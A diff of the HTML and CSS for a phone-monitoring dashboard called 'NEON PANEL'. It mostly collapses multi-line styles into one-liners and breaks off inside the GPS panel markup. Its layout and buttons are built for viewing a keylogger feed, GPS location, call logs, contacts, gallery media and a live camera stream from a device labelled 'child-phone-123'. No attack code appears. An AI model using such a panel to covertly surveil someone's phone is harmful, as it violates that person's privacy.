@@ -4,842 +4,110 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Device Control</title>
-
 <!-- Leaflet CSS -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <!-- Leaflet JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
 <style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-}
-
-body {
-    font-family: 'Inter', 'Poppins', Arial, sans-serif;
-    background: radial-gradient(circle at 30% 20%, #1a0f0f 0%, #0a0808 50%, #050505 100%);
-    color: #eee;
-    min-height: 100vh;
-}
-
-.header {
-    height: 64px;
-    border-bottom: 1px solid rgba(255, 60, 60, 0.25);
-    display: flex;
-    align-items: center;
-    padding: 0 20px;
-    gap: 10px;
-    background: rgba(15, 10, 10, 0.92);
-    backdrop-filter: blur(12px);
-    position: sticky;
-    top: 0;
-    z-index: 20;
-}
-
-.logo {
-    width: 36px;
-    height: 36px;
-    border-radius: 10px;
-    background: #ff3338;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 18px;
-    box-shadow: 0 0 18px rgba(255, 50, 55, 0.35);
-}
-
-.title {
-    font-size: 16px;
-    font-weight: 700;
-    letter-spacing: 0.5px;
-}
-
-.nav {
-    display: flex;
-    gap: 8px;
-    margin-left: 10px;
-}
-
-.nav button {
-    background: #171214;
-    border: 1px solid #302126;
-    color: #aaa;
-    padding: 8px 13px;
-    border-radius: 9px;
-    cursor: pointer;
-    font-size: 11px;
-    transition: all 0.2s;
-}
-
-.nav button:hover {
-    color: white;
-    border-color: #ff3d42;
-    background: #24181a;
-}
-
-.device-id {
-    margin-left: auto;
-    font-size: 10px;
-    color: #777;
-}
-
-.live {
-    color: #ff4646;
-    border: 1px solid #572226;
-    padding: 6px 9px;
-    border-radius: 15px;
-    font-size: 9px;
-    background: rgba(255, 50, 55, 0.05);
-    box-shadow: 0 0 10px rgba(255, 50, 55, 0.2);
-}
-
-.container {
-    padding: 20px;
-    max-width: 1200px;
-    margin: auto;
-}
-
-.device-card {
-    border: 1px solid #3b2529;
-    border-radius: 18px;
-    padding: 20px;
-    background: rgba(22, 15, 17, 0.82);
-    margin-bottom: 18px;
-    backdrop-filter: blur(8px);
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-}
-
-.device-name {
-    font-size: 18px;
-    font-weight: bold;
-}
-
-.device-status {
-    margin-top: 8px;
-    font-size: 12px;
-    color: #aaa;
-}
-
-.online-dot {
-    color: #35c76a;
-}
-
-/* Main Tabs */
-.controls {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 10px;
-    margin-bottom: 20px;
-}
-
-.control-btn {
-    background: transparent;
-    color: #aaa;
-    border: 0;
-    padding: 10px 16px;
-    font-size: 12px;
-    cursor: pointer;
-    border-radius: 30px;
-    transition: all 0.25s;
-    border: 1px solid transparent;
-}
-
-.control-btn:hover {
-    color: #fff;
-    background: rgba(255, 50, 55, 0.08);
-}
-
-.control-btn.active {
-    background: #ff3439;
-    color: white;
-    border-radius: 30px;
-    box-shadow: 0 0 20px rgba(255, 50, 55, 0.5);
-    border-color: #ff3439;
-}
-
-/* Panels */
-.panel {
-    border: 1px solid #3b292d;
-    border-radius: 22px;
-    background: rgba(18, 12, 14, 0.9);
-    overflow: hidden;
-    margin-bottom: 20px;
-    backdrop-filter: blur(10px);
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-}
-
-.panel-header {
-    padding: 20px;
-    border-bottom: 1px solid rgba(255, 50, 55, 0.2);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 15px;
-}
-
-.panel-title {
-    font-size: 20px;
-    font-weight: 700;
-    letter-spacing: -0.5px;
-}
-
-.panel-subtitle {
-    font-size: 12px;
-    color: #888;
-}
-
-.refresh-btn, .force-btn {
-    background: #ff3439;
-    color: white;
-    border: none;
-    border-radius: 30px;
-    padding: 10px 20px;
-    font-size: 12px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: 0 0 20px rgba(255, 50, 55, 0.4);
-}
-
-.refresh-btn:hover, .force-btn:hover {
-    background: #ff4b4f;
-    box-shadow: 0 0 30px rgba(255, 50, 55, 0.7);
-    transform: translateY(-1px);
-}
-
-.refresh-btn:disabled, .force-btn:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-    transform: none;
-}
-
-/* GPS Stat Cards */
-.gps-stats {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    gap: 16px;
-    padding: 20px;
-}
-
-.stat-card {
-    background: linear-gradient(145deg, #1e1416, #141012);
-    border: 1px solid #2d1d20;
-    border-radius: 18px;
-    padding: 20px 18px;
-    min-height: 100px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    transition: transform 0.2s, box-shadow 0.2s;
-    backdrop-filter: blur(8px);
-}
-
-.stat-card:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 10px 25px rgba(255, 50, 55, 0.15);
-}
-
-.stat-label {
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    color: #aaa;
-    margin-bottom: 8px;
-}
-
-.stat-value {
-    font-size: 24px;
-    font-weight: 700;
-    color: #fff;
-}
-
-.stat-value.green {
-    color: #35c76a;
-}
-
-/* Map Container */
-.map-container {
-    margin: 0 20px 20px 20px;
-    border-radius: 20px;
-    overflow: hidden;
-    border: 1px solid rgba(255, 50, 55, 0.3);
-    height: 500px;
-    position: relative;
-}
-
-#map {
-    width: 100%;
-    height: 100%;
-    background: #0d0d0d;
-}
-
-.map-overlay {
-    position: absolute;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(20, 12, 14, 0.9);
-    border: 1px solid #ff3d42;
-    border-radius: 30px;
-    padding: 10px 20px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-size: 12px;
-    color: #fff;
-    z-index: 500;
-    backdrop-filter: blur(8px);
-    box-shadow: 0 0 15px rgba(255, 50, 55, 0.3);
-    transition: all 0.3s;
-}
-
-.spinner {
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-top-color: #ff3439;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-/* ===== KEYLOGGER BOX & CARDS ===== */
-.keylog-box {
-    background: #181214;
-    border: 1px solid #342326;
-    border-radius: 12px;
-    padding: 8px;
-    margin: 20px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    max-height: 70vh;
-    overflow-y: auto;
-}
-
-.keylog-entry {
-    background: #120d10;
-    border: 1px solid #6f252c;
-    border-radius: 12px;
-    padding: 14px 16px;
-    width: 100%;
-    box-sizing: border-box;
-    display: flex;
-    flex-direction: column;
-    gap: 3px;
-    box-shadow: none;
-}
-
-.keylog-title {
-    font-family: 'SF Mono', 'Cascadia Code', 'Roboto Mono', monospace;
-    font-size: 14px;
-    font-weight: 600;
-    line-height: 20px;
-    letter-spacing: 0.2px;
-    color: #e5e7eb;
-    display: flex;
-    align-items: flex-start;
-    gap: 8px;
-    white-space: normal;
-    overflow: visible;
-    word-break: break-word;
-}
-
-.keylog-time {
-    font-family: 'SF Mono', 'Cascadia Code', 'Roboto Mono', monospace;
-    font-size: 13px;
-    font-weight: 400;
-    line-height: 18px;
-    color: #8b8f98;
-    margin: 0;
-}
-
-/* Installed Apps */
-.apps {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 10px;
-    padding: 20px;
-}
-
-.app {
-    background: linear-gradient(145deg, #21181b, #161012);
-    border: 1px solid #302126;
-    border-radius: 10px;
-    padding: 14px 12px;
-    min-height: 60px;
-}
-
-.app-name {
-    font-size: 12px;
-    font-weight: bold;
-}
-
-.package {
-    margin-top: 6px;
-    color: #666;
-    font-size: 9px;
-    word-break: break-all;
-}
-
-/* Gallery Specific */
-.gallery-content {
-    margin: 20px;
-    padding: 0;
-    background: transparent;
-    border: none;
-}
-
-.gallery-controls {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    flex-wrap: wrap;
-    background: #1a1214;
-    border: 1px solid #2d1d20;
-    border-radius: 14px;
-    padding: 14px 18px;
-    margin-bottom: 20px;
-}
-
-.gallery-controls label {
-    color: #aaa;
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-    font-weight: 600;
-}
-
-.gallery-controls select {
-    background: #0d0a0b;
-    color: #fff;
-    border: 1px solid #3b292d;
-    border-radius: 10px;
-    padding: 10px 14px;
-    font-size: 13px;
-    outline: none;
-    cursor: pointer;
-    transition: border-color 0.2s;
-    min-width: 120px;
-}
-
-.gallery-controls select:hover,
-.gallery-controls select:focus {
-    border-color: #ff3439;
-    box-shadow: 0 0 8px rgba(255, 50, 55, 0.2);
-}
-
-.gallery-controls .refresh-btn,
-.gallery-controls .force-btn {
-    padding: 10px 20px;
-    font-size: 12px;
-    white-space: nowrap;
-}
-
-.gallery-section-title {
-    font-size: 14px;
-    font-weight: 700;
-    margin: 20px 0 10px 0;
-    color: #fff;
-}
-
-.badge {
-    background: #ff3439;
-    color: white;
-    font-size: 10px;
-    padding: 3px 8px;
-    border-radius: 12px;
-    margin-left: 8px;
-}
-
-.media-grid {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    gap: 12px;
-}
-
-.media-card {
-    background: #1a1214;
-    border: 1px solid #2d1d20;
-    border-radius: 12px;
-    overflow: hidden;
-    cursor: pointer;
-    transition: transform 0.2s, box-shadow 0.2s;
-    position: relative;
-}
-
-.media-card:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 8px 20px rgba(255, 50, 55, 0.2);
-    border-color: #ff3439;
-}
-
-.media-thumb {
-    width: 100%;
-    height: 140px;
-    object-fit: cover;
-    background: #0d0d0d;
-}
-
-.media-info {
-    padding: 10px;
-}
-
-.media-filename {
-    font-size: 11px;
-    font-weight: bold;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    color: #fff;
-}
-
-.media-meta {
-    font-size: 9px;
-    color: #888;
-    margin-top: 4px;
-}
-
-.media-type-badge {
-    position: absolute;
-    top: 8px;
-    right: 8px;
-    background: rgba(0,0,0,0.7);
-    color: #fff;
-    font-size: 9px;
-    padding: 3px 6px;
-    border-radius: 8px;
-    border: 1px solid #ff3439;
-}
-
-.skeleton-grid {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    gap: 12px;
-}
-
-.skeleton-card {
-    background: #1a1214;
-    border: 1px solid #2d1d20;
-    border-radius: 12px;
-    height: 180px;
-    animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-    0% { opacity: 0.6; }
-    50% { opacity: 0.9; }
-    100% { opacity: 0.6; }
-}
-
-.error-message {
-    text-align: center;
-    padding: 20px;
-    color: #ff6b6b;
-}
-
-.error-message button {
-    background: #ff3439;
-    color: white;
-    border: none;
-    padding: 8px 16px;
-    border-radius: 8px;
-    cursor: pointer;
-    margin-top: 8px;
-}
-
-/* Modal viewer */
-.modal-viewer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.9);
-    z-index: 1000;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    padding: 20px;
-}
-
-.modal-viewer.active {
-    display: flex;
-}
-
-.modal-content {
-    max-width: 90%;
-    max-height: 80%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.modal-content img,
-.modal-content video {
-    max-width: 100%;
-    max-height: 80vh;
-    border-radius: 12px;
-    border: 1px solid #ff3439;
-}
-
-.modal-close {
-    position: absolute;
-    top: 20px;
-    right: 30px;
-    background: #ff3439;
-    color: white;
-    border: none;
-    font-size: 24px;
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    cursor: pointer;
-}
-
-.modal-nav {
-    display: flex;
-    gap: 20px;
-    margin-top: 20px;
-}
-
-.modal-nav button {
-    background: #ff3439;
-    color: white;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 8px;
-    cursor: pointer;
-}
-
-/* ===== CALLS & CONTACTS SPECIFIC ===== */
-.calls-contacts-container {
-    padding: 20px;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 20px;
-    background: transparent;
-}
-
-.calls-section, .contacts-section {
-    background: rgba(18, 12, 14, 0.9);
-    border: 1px solid #3b292d;
-    border-radius: 16px;
-    padding: 15px;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-    backdrop-filter: blur(10px);
-}
-
-.calls-section h2, .contacts-section h2 {
-    font-size: 16px;
-    font-weight: 700;
-    margin-bottom: 15px;
-    color: #fff;
-}
-
-.call-card, .contact-card {
-    background: #120d10;
-    border: 1px solid #6f252c;
-    border-radius: 14px;
-    padding: 12px;
-    margin-bottom: 10px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    transition: transform 0.2s, box-shadow 0.2s;
-}
-
-.call-card:hover, .contact-card:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 4px 15px rgba(255, 50, 55, 0.1);
-}
-
-.avatar {
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    background: #2a1d20;
-    border: 1px solid #6f252c;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    font-size: 16px;
-    color: #fff;
-}
-
-.call-info, .contact-info {
-    flex: 1;
-}
-
-.call-name, .contact-name {
-    font-size: 13px;
-    font-weight: 600;
-    color: #fff;
-}
-
-.call-number, .contact-number {
-    font-size: 11px;
-    color: #e5e7eb;
-    margin-top: 3px;
-}
-
-.call-badge {
-    padding: 4px 10px;
-    border-radius: 12px;
-    font-size: 10px;
-    font-weight: 600;
-    white-space: nowrap;
-}
-
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Inter', 'Poppins', Arial, sans-serif; background: radial-gradient(circle at 30% 20%, #1a0f0f 0%, #0a0808 50%, #050505 100%); color: #eee; min-height: 100vh; }
+.header { height: 64px; border-bottom: 1px solid rgba(255, 60, 60, 0.25); display: flex; align-items: center; padding: 0 20px; gap: 10px; background: rgba(15, 10, 10, 0.92); backdrop-filter: blur(12px); position: sticky; top: 0; z-index: 20; }
+.logo { width: 36px; height: 36px; border-radius: 10px; background: #ff3338; display: flex; align-items: center; justify-content: center; font-size: 18px; box-shadow: 0 0 18px rgba(255, 50, 55, 0.35); }
+.title { font-size: 16px; font-weight: 700; letter-spacing: 0.5px; }
+.nav { display: flex; gap: 8px; margin-left: 10px; }
+.nav button { background: #171214; border: 1px solid #302126; color: #aaa; padding: 8px 13px; border-radius: 9px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
+.nav button:hover { color: white; border-color: #ff3d42; background: #24181a; }
+.device-id { margin-left: auto; font-size: 10px; color: #777; }
+.live { color: #ff4646; border: 1px solid #572226; padding: 6px 9px; border-radius: 15px; font-size: 9px; background: rgba(255, 50, 55, 0.05); box-shadow: 0 0 10px rgba(255, 50, 55, 0.2); }
+.container { padding: 20px; max-width: 1200px; margin: auto; }
+.device-card { border: 1px solid #3b2529; border-radius: 18px; padding: 20px; background: rgba(22, 15, 17, 0.82); margin-bottom: 18px; backdrop-filter: blur(8px); box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4); }
+.device-name { font-size: 18px; font-weight: bold; }
+.device-status { margin-top: 8px; font-size: 12px; color: #aaa; }
+.online-dot { color: #35c76a; }
+.controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
+.control-btn { background: transparent; color: #aaa; border: 0; padding: 10px 16px; font-size: 12px; cursor: pointer; border-radius: 30px; transition: all 0.25s; border: 1px solid transparent; }
+.control-btn:hover { color: #fff; background: rgba(255, 50, 55, 0.08); }
+.control-btn.active { background: #ff3439; color: white; border-radius: 30px; box-shadow: 0 0 20px rgba(255, 50, 55, 0.5); border-color: #ff3439; }
+.panel { border: 1px solid #3b292d; border-radius: 22px; background: rgba(18, 12, 14, 0.9); overflow: hidden; margin-bottom: 20px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5); }
+.panel-header { padding: 20px; border-bottom: 1px solid rgba(255, 50, 55, 0.2); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 15px; }
+.panel-title { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+.panel-subtitle { font-size: 12px; color: #888; }
+.refresh-btn, .force-btn { background: #ff3439; color: white; border: none; border-radius: 30px; padding: 10px 20px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255, 50, 55, 0.4); }
+.refresh-btn:hover, .force-btn:hover { background: #ff4b4f; box-shadow: 0 0 30px rgba(255, 50, 55, 0.7); transform: translateY(-1px); }
+.gps-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; padding: 20px; }
+.stat-card { background: linear-gradient(145deg, #1e1416, #141012); border: 1px solid #2d1d20; border-radius: 18px; padding: 20px 18px; min-height: 100px; display: flex; flex-direction: column; justify-content: center; transition: transform 0.2s, box-shadow 0.2s; backdrop-filter: blur(8px); }
+.stat-card:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 50, 55, 0.15); }
+.stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #aaa; margin-bottom: 8px; }
+.stat-value { font-size: 24px; font-weight: 700; color: #fff; }
+.stat-value.green { color: #35c76a; }
+.map-container { margin: 0 20px 20px 20px; border-radius: 20px; overflow: hidden; border: 1px solid rgba(255, 50, 55, 0.3); height: 500px; position: relative; }
+#map { width: 100%; height: 100%; background: #0d0d0d; }
+.map-overlay { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(20, 12, 14, 0.9); border: 1px solid #ff3d42; border-radius: 30px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; font-size: 12px; color: #fff; z-index: 500; backdrop-filter: blur(8px); box-shadow: 0 0 15px rgba(255, 50, 55, 0.3); }
+.spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #ff3439; border-radius: 50%; animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.keylog-box { background: #181214; border: 1px solid #342326; border-radius: 12px; padding: 8px; margin: 20px; display: flex; flex-direction: column; gap: 8px; max-height: 70vh; overflow-y: auto; }
+.keylog-entry { background: #120d10; border: 1px solid #6f252c; border-radius: 12px; padding: 14px 16px; width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 3px; box-shadow: none; }
+.keylog-title { font-family: monospace; font-size: 14px; font-weight: 600; line-height: 20px; letter-spacing: 0.2px; color: #e5e7eb; white-space: normal; overflow: visible; word-break: break-word; }
+.keylog-time { font-family: monospace; font-size: 13px; font-weight: 400; line-height: 18px; color: #8b8f98; margin: 0; }
+.apps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; }
+.app { background: linear-gradient(145deg, #21181b, #161012); border: 1px solid #302126; border-radius: 10px; padding: 14px 12px; min-height: 60px; }
+.app-name { font-size: 12px; font-weight: bold; }
+.package { margin-top: 6px; color: #666; font-size: 9px; word-break: break-all; }
+.gallery-content { margin: 20px; padding: 0; background: transparent; border: none; }
+.gallery-controls { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; background: #1a1214; border: 1px solid #2d1d20; border-radius: 14px; padding: 14px 18px; margin-bottom: 20px; }
+.gallery-controls label { color: #aaa; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+.gallery-controls select { background: #0d0a0b; color: #fff; border: 1px solid #3b292d; border-radius: 10px; padding: 10px 14px; font-size: 13px; outline: none; cursor: pointer; min-width: 120px; }
+.gallery-section-title { font-size: 14px; font-weight: 700; margin: 20px 0 10px 0; color: #fff; }
+.badge { background: #ff3439; color: white; font-size: 10px; padding: 3px 8px; border-radius: 12px; margin-left: 8px; }
+.media-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+.media-card { background: #1a1214; border: 1px solid #2d1d20; border-radius: 12px; overflow: hidden; cursor: pointer; position: relative; }
+.media-thumb { width: 100%; height: 140px; object-fit: cover; background: #0d0d0d; }
+.media-info { padding: 10px; }
+.media-filename { font-size: 11px; font-weight: bold; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.media-meta { font-size: 9px; color: #888; margin-top: 4px; }
+.media-type-badge { position: absolute; top: 8px; right: 8px; background: rgba(0,0,0,0.7); color: #fff; font-size: 9px; padding: 3px 6px; border-radius: 8px; border: 1px solid #ff3439; }
+.skeleton-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+.skeleton-card { background: #1a1214; border: 1px solid #2d1d20; border-radius: 12px; height: 180px; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 0.9; } 100% { opacity: 0.6; } }
+.error-message { text-align: center; padding: 20px; color: #ff6b6b; }
+.error-message button { background: #ff3439; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-top: 8px; }
+.modal-viewer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; padding: 20px; }
+.modal-viewer.active { display: flex; }
+.modal-content { max-width: 90%; max-height: 80%; display: flex; align-items: center; justify-content: center; }
+.modal-content img, .modal-content video { max-width: 100%; max-height: 80vh; border-radius: 12px; border: 1px solid #ff3439; }
+.modal-close { position: absolute; top: 20px; right: 30px; background: #ff3439; color: white; border: none; font-size: 24px; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; }
+.modal-nav { display: flex; gap: 20px; margin-top: 20px; }
+.modal-nav button { background: #ff3439; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
+.calls-contacts-container { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+.calls-section, .contacts-section { background: rgba(18, 12, 14, 0.9); border: 1px solid #3b292d; border-radius: 16px; padding: 15px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); backdrop-filter: blur(10px); }
+.calls-section h2, .contacts-section h2 { font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #fff; }
+.call-card, .contact-card { background: #120d10; border: 1px solid #6f252c; border-radius: 14px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; transition: transform 0.2s, box-shadow 0.2s; }
+.call-card:hover, .contact-card:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(255,50,55,0.1); }
+.avatar { width: 40px; height: 40px; border-radius: 50%; background: #2a1d20; border: 1px solid #6f252c; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; color: #fff; }
+.call-info, .contact-info { flex: 1; }
+.call-name, .contact-name { font-size: 13px; font-weight: 600; color: #fff; }
+.call-number, .contact-number { font-size: 11px; color: #e5e7eb; margin-top: 3px; }
+.call-badge { padding: 4px 10px; border-radius: 12px; font-size: 10px; font-weight: 600; white-space: nowrap; }
 .incoming { background: rgba(69,232,93,.08); color: #35c76a; border: 1px solid rgba(69,232,93,.25); }
 .outgoing { background: rgba(19,199,232,.08); color: #13c7e8; border: 1px solid rgba(19,199,232,.25); }
 .missed { background: rgba(255,70,90,.08); color: #ff7180; border: 1px solid rgba(255,70,90,.25); }
-
-.call-duration {
-    font-size: 10px;
-    color: #888;
-    margin-top: 3px;
-}
-
-.call-time {
-    font-size: 10px;
-    color: #888;
-    margin-left: 8px;
-}
-
-.contact-actions {
-    display: flex;
-    gap: 8px;
-}
-
-.contact-action-btn {
-    background: transparent;
-    border: 1px solid #6f252c;
-    border-radius: 8px;
-    width: 32px;
-    height: 32px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    color: #ff3439;
-    transition: all 0.2s;
-}
-
-.contact-action-btn:hover {
-    background: rgba(255,50,55,0.1);
-    border-color: #ff3439;
-}
-
-.empty-state {
-    text-align: center;
-    padding: 25px;
-    color: #aaa;
-    font-size: 13px;
-}
-
-.footer-action {
-    width: 100%;
-    margin-top: 10px;
-    padding: 10px;
-    background: transparent;
-    border: 1px solid #6f252c;
-    border-radius: 10px;
-    color: #ff3439;
-    font-size: 12px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s;
-}
-
-.footer-action:hover {
-    background: rgba(255,50,55,0.08);
-    border-color: #ff3439;
-}
-
-/* ===== LIVE CAMERA ===== */
-.camera-container {
-    padding: 20px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 15px;
-}
-
-.camera-box {
-    width: 100%;
-    max-width: 800px;
-    height: 500px;
-    background: #120d10;
-    border: 1px solid #6f252c;
-    border-radius: 16px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #888;
-}
-
-#remoteVideo {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    border-radius: 16px;
-}
-
-.camera-controls button {
-    background: #ff3439;
-    color: white;
-    border: none;
-    border-radius: 30px;
-    padding: 12px 24px;
-    font-weight: 600;
-    cursor: pointer;
-    margin: 5px;
-}
-
-/* Responsive */
-@media(max-width: 900px) {
-    .calls-contacts-container {
-        grid-template-columns: 1fr;
-    }
-    .gps-stats { grid-template-columns: repeat(2, 1fr); }
-    .apps { grid-template-columns: repeat(2, 1fr); }
-    .media-grid, .skeleton-grid { grid-template-columns: repeat(3, 1fr); }
-    .gallery-controls { gap: 8px; }
-}
-
-@media(max-width: 600px) {
-    .header { flex-wrap: wrap; height: auto; padding: 10px; }
-    .nav { overflow-x: auto; width: 100%; order: 3; }
-    .device-id { margin-left: auto; }
-    .container { padding: 10px; }
-    .gps-stats { grid-template-columns: repeat(2, 1fr); gap: 10px; }
-    .map-container { height: 350px; margin: 0 10px 10px 10px; }
-    .controls { gap: 6px; overflow-x: auto; flex-wrap: nowrap; }
-    .control-btn { padding: 8px 12px; white-space: nowrap; }
-    .panel-header { flex-direction: column; align-items: flex-start; }
-    .media-grid, .skeleton-grid { grid-template-columns: repeat(2, 1fr); }
-    .gallery-controls { flex-direction: column; align-items: flex-start; }
-    .gallery-controls select { width: 100%; }
-    .gallery-controls .refresh-btn,
-    .gallery-controls .force-btn { width: 100%; margin-top: 4px; }
-    .keylog-entry { padding: 12px; }
-    .call-card, .contact-card { flex-wrap: wrap; }
-    .contact-actions { margin-left: auto; }
-}
+.call-duration { font-size: 10px; color: #888; margin-top: 3px; }
+.call-time { font-size: 10px; color: #888; margin-left: 8px; }
+.contact-actions { display: flex; gap: 8px; }
+.contact-action-btn { background: transparent; border: 1px solid #6f252c; border-radius: 8px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #ff3439; }
+.contact-action-btn:hover { background: rgba(255,50,55,0.1); border-color: #ff3439; }
+.empty-state { text-align: center; padding: 25px; color: #aaa; font-size: 13px; }
+.footer-action { width: 100%; margin-top: 10px; padding: 10px; background: transparent; border: 1px solid #6f252c; border-radius: 10px; color: #ff3439; font-size: 12px; font-weight: 600; cursor: pointer; }
+.footer-action:hover { background: rgba(255,50,55,0.08); border-color: #ff3439; }
+.camera-container { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
+.camera-box { width: 100%; max-width: 800px; height: 500px; background: #120d10; border: 1px solid #6f252c; border-radius: 16px; display: flex; align-items: center; justify-content: center; color: #888; }
+#remoteVideo { width: 100%; height: 100%; object-fit: contain; border-radius: 16px; }
+.camera-controls button { background: #ff3439; color: white; border: none; border-radius: 30px; padding: 12px 24px; font-weight: 600; cursor: pointer; margin: 5px; }
+@media(max-width: 900px) { .calls-contacts-container { grid-template-columns: 1fr; } .gps-stats { grid-template-columns: repeat(2,1fr); } .apps { grid-template-columns: repeat(2,1fr); } .media-grid,.skeleton-grid { grid-template-columns: repeat(3,1fr); } }
+@media(max-width: 600px) { .header { flex-wrap: wrap; height: auto; padding: 10px; } .nav { overflow-x: auto; width: 100%; order: 3; } .container { padding: 10px; } .gps-stats { grid-template-columns: repeat(2,1fr); gap: 10px; } .map-container { height: 350px; margin: 0 10px 10px 10px; } .media-grid,.skeleton-grid { grid-template-columns: repeat(2,1fr); } .keylog-entry { padding: 12px; } .call-card,.contact-card { flex-wrap: wrap; } .contact-actions { margin-left: auto; } }
 </style>
 </head>
-
 <body>
-
 <header class="header">
     <div class="logo">⌁</div>
     <div class="title">NEON PANEL</div>
@@ -850,20 +118,11 @@ body {
     <div class="device-id" id="deviceIdDisplay">DEVICE ID: <b>child-phone-123</b></div>
     <div class="live">● LIVE LINK</div>
 </header>
-
 <main class="container">
-
-    <!-- Device Info Card -->
     <section class="device-card">
         <div class="device-name" id="deviceName">📱 Loading...</div>
-        <div class="device-status">
-            <span class="online-dot">●</span>
-            <span id="deviceStatusText">Loading...</span>
-            &nbsp; • &nbsp; Battery <span id="batteryLevel">—</span>%
-        </div>
+        <div class="device-status"><span class="online-dot">●</span><span id="deviceStatusText">Loading...</span>&nbsp; • &nbsp; Battery <span id="batteryLevel">—</span>%</div>
     </section>
-
-    <!-- Main Tabs -->
     <div class="controls">
         <button class="control-btn" onclick="showApps(this)">▦ Installed Apps</button>
         <button class="control-btn" onclick="showGPS(this)">📍 GPS Tracker</button>
@@ -872,148 +131,71 @@ body {
         <button class="control-btn" onclick="showCallsContacts(this)">📞 Calls & Contacts</button>
         <button class="control-btn" onclick="showCamera(this)">🎥 Live Camera</button>
     </div>
-
-    <!-- GPS Tracker Panel -->
+    <!-- GPS Panel -->
     <section class="panel" id="gpsPanel">
-        <div class="panel-header">
-            <div>
